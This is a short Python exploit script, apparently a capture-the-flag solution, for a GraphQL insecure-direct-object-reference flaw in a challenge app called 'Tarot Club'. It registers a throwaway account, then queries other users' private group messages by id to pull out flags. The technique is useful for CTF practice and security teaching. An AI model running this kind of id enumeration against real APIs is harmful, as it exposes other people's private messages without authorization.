#!/usr/bin/env python3
"""Tarot Club — GraphQL IDOR: user(id).privateGroups.messages leaks flag.

Usage: python3 exp_tarot_idor.py HOST PORT
"""
import re, sys, json, random, string, urllib.request

FLAG_RE = re.compile(r"GEMASTIK\{[^}\s]{48}\}")

def gql(host, port, query, token=None):
    body = json.dumps({"query": query}).encode()
    req = urllib.request.Request(f"http://{host}:{port}/graphql", data=body,
                                 headers={"Content-Type": "application/json"})
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    return json.loads(urllib.request.urlopen(req, timeout=8).read().decode())

def exploit(host, port, flag_id=None):
    user = "tar" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    pw = "Passw0rd123!"
    gql(host, port, f'mutation{{register(username:"{user}",password:"{pw}"){{}}}}')
    r = gql(host, port, f'mutation{{login(username:"{user}",password:"{pw}")}}')
    token = r["data"]["login"]
    flags = []
    # flag lives in private group of admin (user id 2); scan a few ids
    for uid in (1, 2):
        r = gql(host, port,
                f'query{{user(id:{uid}){{privateGroups{{messages{{body}}}}}}}}',
                token=token)
        text = json.dumps(r)
        flags += FLAG_RE.findall(text)
    return flags

if __name__ == "__main__":
    host, port = sys.argv[1], int(sys.argv[2])
    for f in exploit(host, port):
        print(f)
